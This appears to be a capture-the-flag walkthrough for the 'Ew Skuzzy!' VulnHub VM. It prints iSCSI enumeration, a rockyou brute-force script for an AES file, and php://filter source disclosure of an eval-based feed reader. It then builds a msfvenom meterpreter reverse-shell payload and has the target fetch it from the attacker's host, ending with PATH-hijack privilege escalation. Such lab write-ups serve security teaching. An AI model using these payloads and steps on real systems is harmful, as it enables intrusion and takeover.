@@ -1,0 +1,430 @@
+Recon Phase:
+
+$ nmap -p 1-65535 -T4 -A -v 172.16.34.158
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)
+    |_  256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)
+    80/tcp   open  http    nginx
+    | http-methods:
+    |_  Supported Methods: GET HEAD
+    |_http-server-header: nginx
+    |_http-title: Welcome!
+    3260/tcp open  iscsi?
+    |_iscsi-info: ERROR: Script execution failed (use -d to debug)
+Via port 80
+
+    ______            _____ __                         __
+    / ____/      __   / ___// /____  __________  __  __/ /
+    / __/ | | /| / /   \__ \/ //_/ / / /_  /_  / / / / / /
+    / /___ | |/ |/ /   ___/ / ,< / /_/ / / /_/ /_/ /_/ /_/
+    /_____/ |__/|__/   /____/_/|_|\__,_/ /___/___/\__, (_)
+                                             /____/
+
+    Welcome to 'Ew Skuzzy!' - my first CTF VM.
+    Level: Intermediate.
+
+    Forgive the name... I heard a kid say it in a shopping centre; Or,
+    perhaps it's a hint? Or am I trolling? ¯\_(ツ)_/¯
+
+    You'll just have to fireup dirbuster and find out!
+
+    Flags will be found along the way, if you're on the right path. Most flag
+    data is not of any signifigance to the challenge.
+
+    Hints available at /dev/null, or ping me on Twitter @vortexau
+    (UTC+9.5 timezone, I'm probably sleeping while you're awake!).
+
+    Please let me know what you think of the challenge once you're done,
+    and submit your walkthroughs to VulnHub, I'm really looking forward to reading them!
+
+Then i started dirb
+$ dirb http://172.16.34.158
+Then i found this result
+http://172.16.34.158/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/
+Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/
+queues/month/checking/mode/trap/affiliates/dba/program/font/index.html
+
+Then view page source
+    <!--
+    SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlv
+    dXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZl
+    ciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qg
+    d2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRl
+    bGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K
+    -->
+
+It's base64
+$ echo "SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGlu
+IHlvdXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZl
+ciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qgd2hh
+dCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRlbGwgeW91
+IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K" | base64 -d
+
+    Hello, is it flags you're looking for?
+    I can see it in your eyes
+    I can see it in your smile
+    Flags are all I've ever wanted and my ports are open wide
+    Cause you know just what to say and you know just what to do
+    And I want to tell you so much, no flags for you...
+=================================================================
+Attacking Phase:
+
+
+Then i tried iSCSI port via iSCSI Initiator
+$ iscsiadm -m discovery -t st -p 172.16.34.158
+$ iscsiadm -m node --login
+Now it's mounted to my system /media/root/
+$ ls -al
+    -rw-r--r--  1 root root 104857600 Mar 19 13:39 bobsdisk.dsk
+    -rw-r--r--  1 root root       143 Mar 19 13:20 flag1.txt
+    drwx------  2 root root     16384 Feb 28 10:39 lost+found
+$ cat flag1.txt
+    Congratulations! You've discovered the first flag!
+    flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd} ---> First flag
+    Let's see how you go with the next one...
+=================================================================
+$ file bobsdisk.dsk
+it's ext2 filesystem disk
+$ mkdir /media/new
+$ mount bobsdisk.dsk /media/new -t ext2
+$ cd /media/new
+$ ls -al
+    drwx------  2 root root 12288 Feb 28 10:56 lost+found
+    -rw-r--r--  1 root root   288 Feb 28 11:25 ToAlice.csv.enc
+    -rw-r--r--  1 root root  2342 Mar  5 11:00 ToAlice.eml
+$ cat ToAlice.eml
+
+G'day Alice,
+
+You know what really annoys me? How you and I ended up being used, like some kind of
+guinea pigs, by the RSA crypto wonks as actors in their designs for public key crypto...
+I don't recall ever being asked if that was ok? I never got even one cent of royalties
+from them!? RSA have made Millions on our backs, and it's time we took a stand!
+
+Starting now, today, immediately, I'm never using asymmetric key encryption again,
+and it's all symmetric keys from here on out. All my files and documents will be
+encrypted with that popular symmetric crypto algorithm. Uh. Yeah,
+I can't pronounce its original name. I don't even know what the letters in its
+other name stand for - but really - that's not important. A bloke at my local
+hackerspace says its the beez kneez, ridgy-didge, real-deal, the best there is when
+it comes to symmetric key crypto, he has heaps of stickers on his laptop so I guess
+it means he knows, right? Anyway, he said it won some big important competition among
+crypto geeks in October 2000? Lucky Y2K didn't happen then, I suppose or that would
+have been one boring party!
+
+Anyway this algorithm sounded good to me. I used the updated version that won the
+competition.
+
+You know what happened to me this morning? My kids, the little darlings, had
+spilled their fancy 256 bit Lego kit all over the damn floor. Sigh. Of course
+I trod on it making my coffee, the level of pain really does ROCKYOU to the core
+when it happens! It's hard to stay mad though, I really love Lego, the way those
+blocks chain togeather really does make them work brilliantly.
+
+Anyway, given I'm not not using asymmetric crypto any longer, I destroyed my
+private key, so the public key you have for me may as well be deleted. I've got some notes for you which might help in your current case, I've encrypted it using my new favourite symmetric key crypto algorithm, it should be on the disk with this note.
+
+Give me a shout when you're down this way again, we'll catch up for coffee
+(once the Lego is removed from my foot) :)
+
+Cheers,
+
+Bob.
+
+PS: Oh, before I forget, the hacker-kid who told me how to use this new algorithm, said it was very important I used the command option -md sha256 when decrypting. Why? Who knows? He said something about living on the bleeding-edge...
+
+PPS: flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f} ---> Second flag
+=================================================================
+From this file the algorithm is AES 256 with mode (cbc) cipher block chaining
+and i think i should use rockyou wordlist to get crack it
+so i used this code
+
+#!/usr/bin/python
+
+from subprocess import PIPE, Popen
+import subprocess
+import sys
+
+def cmdline(command):
+    proc = subprocess.Popen(str(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    return err
+//////////////////////////////////////////////////////////////
+def combinations(words, length):
+    if length == 0:
+        return []
+    result = [[word] for word in words]
+    while length > 1:
+        new_result = []
+        for combo in result:
+            new_result.extend(combo + [word] for word in words)
+        result = new_result[:]
+        length -= 1
+    return result
+
+def main():
+    words = [line.strip() for line in open('/usr/share/wordlists/rockyou.txt')]
+    s = b'writing RSA key\r\n';
+    print("\n")
+
+    res = combinations(words, 1)
+    c = len(res)-1
+    for idx, result in enumerate(res):
+        str1 = "openssl aes-256-cbc -d -md sha256 -in /media/root/new/ToAlice.csv.enc
+        -out /root/Desktop/ouut.txt -passin pass:"+result[0]
+        if cmdline(str1) == s:
+            print("\nKey Found! The key is: "+result[0])
+            sys.exit()
+        print(str(idx)+"/"+str(c))
+    print("\n")
+if __name__ == '__main__':
+    main()
+Thanks http://stackoverflow.com/questions/30391404/dictionary-based-bruteforce-on-a-rsa-private-key
+//////////////////////////////////////////////////////////////
+you have to divide the wordlist into many smaller files because it's gonna take along time
+Key Found! The key is: supercalifragilisticoespialidoso
+$ cat ouut.txt
+
+Web Path,Reason
+5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site!
+c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
+flag3{2cce194f49c6e423967b7f72316f48c5caf46e84}, ---> Third flag
+The strangest URL I've seen? What is it?
+=================================================================
+The first link gave me encoding text when i decoded it
+      George Costanza: [Soup Nazi gives him a look] Medium turkey chili.
+      [instantly moves to the cashier]
+      Jerry Seinfeld: Medium crab bisque.
+      George Costanza: [looks in his bag and notices no bread in it] I didn't get any bread.
+      Jerry Seinfeld: Just forget it. Let it go.
+      George Costanza: Um, excuse me, I - I think you forgot my bread.
+      Soup Nazi: Bread, $2 extra.
+      George Costanza: $2? But everyone in front of me got free bread.
+      Soup Nazi: You want bread?
+      George Costanza: Yes, please.
+      Soup Nazi: $3!
+      George Costanza: What?
+      Soup Nazi: NO FLAG FOR YOU
+Then i tried the second link to Load feeder woth LFI
+http://172.16.34.158/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt
+i tried using a reverse php shell it is says "Authentication invalid. You might need a key."
+so i tried PHP filters on reader.php to pass around this key by encoding the contents the decode it
+
+http://172.16.34.158/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php
+
+PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+
+RmVlZCBSZWFkZXI8L2gxPgo8P3BocAppZihpc3NldCgkX0dFVFsndXJsJ10pKSB7CiAgICAkdXJsID0gJF9HR
+VRbJ3VybCddOwp9IGVsc2UgewogICAgcHJpbnQoIjxhIGhyZWY9XCI/cD1yZWFkZXImdXJsPWh0dHA6Ly8xMj
+cuMC4wLjEvYzI0NDQ5MTA3OTRlMDM3ZWJkOGFhZjI1NzE3OGM5MGIvZGF0YS50eHRcIj5Mb2FkIEZlZWQ8L2E+
+Iik7Cn0KCmlmKGlzc2V0KCR1cmwpICYmIHN0cmxlbigkdXJsKSAhPSAnJykgewoKICAgIC8vIFNldHVwIHNvbW
+UgdmFyaWFibGVzLgogICAgJHNlY3JldG9rID0gZmFsc2U7CiAgICAka2V5bmVlZGVkID0gdHJ1ZTsKCiAgICAvL
+yBMb2NhbGhvc3QgYXMgYSBzb3VyY2UgZG9lc24ndCBuZWVkIHRvIHVzZSB0aGUga2V5LgogICAgaWYocHJlZ19t
+YXRjaCgiI15odHRwOi8vMTI3LjAuMC4xIyIsICR1cmwpKSB7CiAgICAgICAgJGtleW5lZWRlZCA9IGZhbHNlOwog
+ICAgICAgICRzZWNyZXRvayA9IHRydWU7CiAgICB9CgogICAgLy8gSGFuZGxlIHRoZSBrZXkgdmFsaWRhdGlvbiB
+3aGVuIGl0J3MgbmVlZGVkLgogICAgaWYoJGtleW5lZWRlZCkgewogICAgICAgICRrZXkgPSAkX0dFVFsna2V5J10
+7CiAgICAgICAgaWYoaXNfYXJyYXkoJGtleSkpIHsKICAgICAgICAgICAgZGllKCJBcnJheSB0cmljayBpcyBtaX
+RpZ2F0ZWQgOykiKTsKICAgICAgICB9CiAgICAgICAgaWYoaXNzZXQoJGtleSkgJiYgc3RybGVuKCRrZXkpID09I
+Cc0NycpIHsKCSAgICAkaGFzaGVka2V5ID0gaGFzaCgnc2hhMjU2JywgJGtleSk7CiAgICAgICAgICAgICRzZWNy
+ZXQgPSAiNWNjZDBkYmRlZWZiZWUwNzhiODhhNmU1MmRiOGMxY2FhOGRkODMxNWYyMjdmZTFlNmFlZTZiY2I2ZGI2
+MzY1NiI7CgogICAgICAgICAgICAvLyBJZiB5b3UgY2FuIHVzZSB0aGUgZm9sbG93aW5nIGNvZGUgZm9yIGEgdGlt
+aW5nIGF0dGFjawogICAgICAgICAgICAvLyB0aGVuIGdvb2QgbHVjayA6KSBCdXQuLiBZb3UgaGF2ZSB0aGUgc291
+cmNlIGFueXdheSwgcmlnaHQ/IDopIAoJICAgIGlmKHN0cmNtcCgkaGFzaGVka2V5LCAkc2VjcmV0KSA9PSAwKSB7
+CiAgICAgICAgICAgICAgICAkc2VjcmV0b2sgPSB0cnVlOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgIC
+AgICAgZGllKCJTb3JyeS4uLiBBdXRoZW50aWNhdGlvbiBmYWlsZWQuIEtleSB3YXMgaW52YWxpZC4iKTsKCSAgIC
+B9CgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGRpZSgiQXV0aGVudGljYXRpb24gaW52YWxpZC4gWW91IG
+1pZ2h0IG5lZWQgYSBrZXkuIik7CiAgICAgICAgfQogICAgfQoKICAgIC8vIEp1c3QgdG8gbWFrZSBzdXJlIHRoZS
+BhYm92ZSBrZXkgY2hlY2sgd2FzIHBhc3NlZC4KICAgIGlmKCEkc2VjcmV0b2spIHsKICAgICAgICBkaWUoIlNvbW
+V0aGluZyB3ZW50IHdyb25nIHdpdGggdGhlIGF1dGhlbnRpY2F0aW9uIHByb2Nlc3MiKTsKICAgIH0KCiAgICAvLy
+BOb3cgbG9hZCB0aGUgY29udGVudHMgb2YgdGhlIGZpbGUgd2UgYXJlIHJlYWRpbmcsIGFuZCBwYXJzZQogICAgLy
+8gdGhlIHN1cGVyIGF3ZXNvbWVuZXNzIG9mIGl0cyBjb250ZW50cyEKICAgICRmID0gZmlsZV9nZXRfY29udGVudH
+MoJHVybCk7CgogICAgJHRleHQgPSBwcmVnX3NwbGl0KCIvIyN0ZXh0IyMvcyIsICRmKTsKCiAgICBpZihpc3NldC
+gkdGV4dFsnMSddKSAmJiBzdHJsZW4oJHRleHRbJzEnXSkgPiAwKSB7CiAgICAgICAgcHJpbnQoJHRleHRbJzEnXS
+k7CiAgICB9CgogICAgcHJpbnQgIjxiciAvPjxiciAvPiI7CgogICAgJHBocCA9IHByZWdfc3BsaXQoIi8jI3BocCMj
+L3MiLCAkZik7CgogICAgaWYoaXNzZXQoJHBocFsnMSddKSAmJiBzdHJsZW4oJHBocFsnMSddKSA+IDApIHsgCiAg
+ICAgICAgZXZhbCgkcGhwWycxJ10pOwogICAgICAgIC8vICJJZiBFdmFsIGlzIHRoZSBhbnN3ZXIsIHlvdSdyZSBhc
+2tpbmcgdGhlIHdyb25nIHF1ZXN0aW9uISIgLSBTRwogICAgICAgIC8vIEl0IGh1cnRzIG1lIHRvIHdyaXRlIGluc
+2VjdXJlIGNvZGUgbGlrZSB0aGlzLCBidXQgaXQgaXMgaW4gdGhlCiAgICAgICAgLy8gbmFtZSBvZiBlZHVjYXRpb
+24sIGFuZCBGVU4sIHNvIEknbGwgbGV0IGl0IHNsaWRlIHRoaXMgdGltZS4KICAgIH0KfQoK
+
+Then passing that to base64
+      <?php
+      defined ('VIAINDEX') or die('Ooooh! So close..');
+      ?>
+      <h1>Feed Reader</h1>
+      <?php
+      if(isset($_GET['url'])) {
+          $url = $_GET['url'];
+      } else {
+          print("<a href=\"?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt\">Load Feed</a>");
+      }
+
+      if(isset($url) && strlen($url) != '') {
+
+          // Setup some variables.
+          $secretok = false;
+          $keyneeded = true;
+
+          // Localhost as a source doesn't need to use the key.
+          if(preg_match("#^http://127.0.0.1#", $url)) {
+              $keyneeded = false;
+              $secretok = true;
+          }
+
+          // Handle the key validation when it's needed.
+          if($keyneeded) {
+              $key = $_GET['key'];
+              if(is_array($key)) {
+                  die("Array trick is mitigated ;)");
+              }
+              if(isset($key) && strlen($key) == '47') {
+      	    $hashedkey = hash('sha256', $key);
+                  $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";
+
+                  // If you can use the following code for a timing attack
+                  // then good luck :) But.. You have the source anyway, right? :)
+      	    if(strcmp($hashedkey, $secret) == 0) {
+                      $secretok = true;
+                  } else {
+                      die("Sorry... Authentication failed. Key was invalid.");
+      	    }
+
+              } else {
+                  die("Authentication invalid. You might need a key.");
+              }
+          }
+
+          // Just to make sure the above key check was passed.
+          if(!$secretok) {
+              die("Something went wrong with the authentication process");
+          }
+
+          // Now load the contents of the file we are reading, and parse
+          // the super awesomeness of its contents!
+          $f = file_get_contents($url);
+
+          $text = preg_split("/##text##/s", $f);
+
+          if(isset($text['1']) && strlen($text['1']) > 0) {
+              print($text['1']);
+          }
+
+          print "<br /><br />";
+
+          $php = preg_split("/##php##/s", $f);
+
+          if(isset($php['1']) && strlen($php['1']) > 0) {
+              eval($php['1']);
+              // "If Eval is the answer, you're asking the wrong question!" - SG
+              // It hurts me to write insecure code like this, but it is in the
+              // name of education, and FUN, so I'll let it slide this time.
+          }
+      }
+so it use a key with 47 long
+Then i tried to read data.txt
+http://172.16.34.158/c2444910794e037ebd8aaf257178c90b/data.txt
+    ##text##
+    This is some example source data for my nice little feed reader.
+    I have designed my own nice little format which will allow it to include dynamic
+    content. Who needs consultants when it's this easy? :)
+
+    One of the best things is this will allow me to host my feed content to display
+    on this page on an external server! So flexible :D
+    ##text##
+
+    ##php##
+    print("See? This is totally dynamic, generated by PHP right in my own little
+    tool. Hacker proof, too, because there is a secret key required!");
+    ##php##
+
+It uses ##php## to parse PHP language
+Then i tried with flag.php
+
+http://172.16.34.158/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+
+PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE
++RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCB
+tYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+C
+jxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWc
+hIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKL
+y8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQo
+vLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg==
+
+ $echo "PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE
+ +RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCB
+ tYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+C
+ jxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWc
+ hIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKL
+ y8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQo
+ vLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg== " | base64 -d
+
+       <?php
+      defined ('VIAINDEX') or die('Ooooh! So close..');
+      ?>
+      <h1>Flag</h1>
+      <p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
+      <img src="trollface.png" />
+      <?php
+      // Ok, ok. Here's your flag!
+      //
+      // flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b} ---> Fourth flag
+      //
+      // Well done, you're doing great so far!
+      // Next step. SHELL!
+      //
+      //
+      // Oh. That flag above? You're gonna need it...
+      ?>
+=================================================================
+i notices flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b} is 47 long maybe it's the key
+then i prepared a reverse php shell on my local machine
+
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.34.1 LPORT=1234 -f raw > shell.txt
+Then open shell.txt and change <?php into ##php##
+then i did setup for multihandler
+$ msf > use exploit/multi/handler
+$ msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+$ msf exploit(handler) > set lhost 172.16.34.1
+$ msf exploit(handler) > set lport 1234
+$ msf exploit(handler) > exploit
+Then from my browser
+
+http://172.16.34.158/c2444910794e037ebd8aaf257178c90b/index.php?p=reader&url=http://
+172.16.34.1/shell.txt&key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+
+Got a shell !!
+After runing linux-local-enum.sh it found /opt/alicebackup
+$ ./alicebackup
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+ssh: Could not resolve hostname alice.home: Name or service not known
+lost connection
+it run id and scp as root!
+
+Privilege Escalation:
+
+$ echo "/bin/bash" > /tmp/scp
+$ chmod +x /tmp/scp
+$ export PATH=/tmp:$PATH
+$ cd /opt
+$ ./alicebackup
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+Now i'm root !!
+
+$ cat /root/flag.txt
+Congratulations!
+
+flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a} ---> Fifth flag
+
+You've found the final flag and pwned this CTF VM!
+
+I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!
+
+I'd love to hear your thoughts on this one.
+Too easy?
+Too hard?
+Too much stuff to install to get the iSCSI initiator working?
+
+Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
+=================================================================
